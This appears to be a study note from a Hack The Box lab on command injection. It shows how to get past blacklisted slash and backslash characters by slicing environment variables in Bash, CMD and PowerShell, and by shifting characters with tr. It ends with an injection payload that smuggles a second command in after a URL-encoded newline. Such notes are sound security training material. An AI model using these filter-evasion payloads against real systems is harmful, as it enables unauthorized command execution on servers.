# Bypassing Other Blacklisted Characters

## Linux
`\` and `/` is often blacklisted. One such technique for replacing slashes or any other characters is through Linux Environment Variables. For example, `$PATH` may look something like:
```
farelmusyaffa@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```
We can use this to get a `/` character:
```
farelmusyaffa@htb[/htb]$ echo ${PATH:0:1}

/
```
Use `printenv` command to print all environment variables
## Windows
CMD
```
C:\htb> echo %HOMEPATH:~6,-11%

\
```
Powershell
```
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```
Use `Get-ChildItem Env:` to print all environment variables

## Character Shifting
```
farelmusyaffa@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
farelmusyaffa@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

Exercise payload: <br>
`127.0.0.1%0a{ls,-al,${PATH:0:1}home}`
